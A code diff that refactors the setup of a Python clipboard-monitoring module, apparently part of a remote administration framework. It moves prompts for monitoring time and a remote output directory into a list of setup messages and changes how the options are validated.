@@ -15,25 +15,23 @@ class Module(ModuleABC):
             "Stoppable": False
         }
 
-    def setup(self) -> Tuple[bool, Optional[dict]]:
-        monitor_time = self._view.prompt("Time in seconds to monitor the clipboard [ENTER for 0]: ")
+    def get_setup_messages(self) -> List[str]:
+        return [
+            "Time in seconds to monitor the clipboard (Leave empty for 0): ",
+            "Remote output directory (Leave empty to not output to a file): "
+        ]
+
+    def setup(self, set_options: list) -> Tuple[bool, Optional[dict]]:
+        monitor_time = set_options[0]
 
         if not monitor_time:
             monitor_time = 0
 
         if not str(monitor_time).isdigit():
-            self._view.output("Invalid monitor time (should be in seconds).", "attention")
+            self._view.display_error("Invalid monitor time (should be in seconds).")
             return False, None
         else:
-            should_output = self._view.prompt("Would you like to output to a file? [y/N] ").lower()
-
-            if should_output == "y":
-                output_file = self._view.prompt("Remote output directory [ENTER for /tmp/<RANDOM>]:")
-
-                if not output_file:
-                    output_file = os.path.join("/tmp", random_string(8) + ".txt")
-            else:
-                output_file = ""
+            output_file = set_options[1]
 
             return True, {
                 "monitor_time": monitor_time,
